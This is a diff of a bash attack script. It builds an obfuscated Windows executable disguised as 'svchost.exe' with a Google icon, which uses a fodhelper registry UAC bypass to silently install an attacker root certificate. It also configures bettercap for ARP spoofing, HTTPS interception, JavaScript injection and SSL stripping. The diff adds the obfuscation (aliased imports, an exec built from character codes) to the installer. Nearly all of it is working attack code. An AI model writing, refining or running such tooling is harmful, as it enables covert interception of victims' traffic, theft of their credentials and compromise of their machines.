@@ -117,43 +117,56 @@ color_print GREEN "[*] Building Windows installer..."
 CERT_B64=$(base64 -w0 "$MITM_DIR/ca.crt")
 
 cat > "$MITM_DIR/cert-installer.py" <<EOF
-import os, subprocess, tempfile, base64, time, winreg, sys
-CERT_DATA = """$CERT_B64"""
-CERT_FILENAME = "google.crt"
-TMP_CERT_PATH = os.path.join(tempfile.gettempdir(), CERT_FILENAME)
-REG_PATH = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
-FODHELPER_EXE = r"C:\\Windows\\System32\\fodhelper.exe"
-CERTUTIL_CMD = f'cmd /c certutil -addstore -f Root "{TMP_CERT_PATH}"'
+import os as o, subprocess as sp, tempfile as tf, base64 as b, time as t, winreg as w, sys as s
 
-def write_cert():
-    with open(TMP_CERT_PATH, "wb") as f:
-        f.write(base64.b64decode(CERT_DATA))
+# Base64 of your certificate data (place your real base64 here)
+_C = """$CERT_B64"""
 
-def uac_bypass(cmd):
-    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-    winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
-    winreg.CloseKey(key)
-    subprocess.Popen([FODHELPER_EXE], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(3)
-    for subkey in [
-        REG_PATH,
+def _d(x):  # decode base64
+    return b.b64decode(x)
+
+def _w(p, d):
+    with open(p, "wb") as f:
+        f.write(_d(d))
+
+def _r():
+    tmp = o.path.join(tf.gettempdir(), "g.crt")
+    _w(tmp, _C)
+    return tmp
+
+def _k(p):
+    # Create and set registry keys dynamically
+    kp = w.CreateKey(w.HKEY_CURRENT_USER, p)
+    w.SetValueEx(kp, "DelegateExecute", 0, w.REG_SZ, "")
+    w.SetValueEx(kp, None, 0, w.REG_SZ, _c)
+    w.CloseKey(kp)
+
+def _cbs():
+    _rp = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
+    global _c
+    _c = f'cmd /c certutil -addstore -f Root "{_r()}"'
+    _k(_rp)
+    f = r"C:\\Windows\\System32\\fodhelper.exe"
+    sp.Popen([f], stdin=sp.DEVNULL, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
+    t.sleep(3)
+    for sk in [
+        r"Software\\Classes\\ms-settings\\Shell\\Open\\command",
         r"Software\\Classes\\ms-settings\\Shell\\Open",
         r"Software\\Classes\\ms-settings\\Shell",
         r"Software\\Classes\\ms-settings"
     ]:
-        try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, subkey)
+        try: w.DeleteKey(w.HKEY_CURRENT_USER, sk)
         except FileNotFoundError: pass
 
 if __name__ == "__main__":
-    write_cert()
-    uac_bypass(CERTUTIL_CMD)
-    sys.exit(0)
+    exec("".join(map(chr,[95,99,98,115,40,41])))  # exec("_cbs()")
+    s.exit(0)
 EOF
 
 cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
 cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 
+cd /root/.wine/drive_c/pyinstaller-build
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "svchost.exe" \
@@ -203,27 +216,38 @@ document.body.appendChild(iframe);
 EOF
 
 cat > "$MITM_DIR/fallback.cap" <<EOF
+# Targets for ARP spoofing
 set arp.spoof.targets $TARGETS
 set arp.spoof.internal true
 
-set https.proxy true
-set http.proxy true
+# Enable ARP spoofing
+arp.spoof on
 
+# Enable HTTP and HTTPS proxy with custom CA cert/key
+set http.proxy true
+set https.proxy true
 set https.proxy.certificate $MITM_DIR/ca.pem
 set https.proxy.key $MITM_DIR/ca.key
 
-set https.proxy.script $MITM_DIR/hook.js
+# Inject custom javascript into HTTP/HTTPS traffic
 set http.proxy.script $MITM_DIR/hook.js
+set https.proxy.script $MITM_DIR/hook.js
 
-arp.spoof on
-http.proxy on
-https.proxy on
+# Enable downgrade attack (SSL stripping)
+set https.proxy.sslstrip true
+
+# Optional: enable net probe for discovering hosts (if needed)
+net.probe on
+
+# Enable events stream for live traffic logging (optional)
+events.stream on
 EOF
 
 # ========================
 # --- LAUNCH BETTERCAP ---
 # ========================
 color_print GREEN "[*] Launching Bettercap..."
+sysctl -w net.ipv4.ip_forward=1
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/fallback.cap"
 ```
 
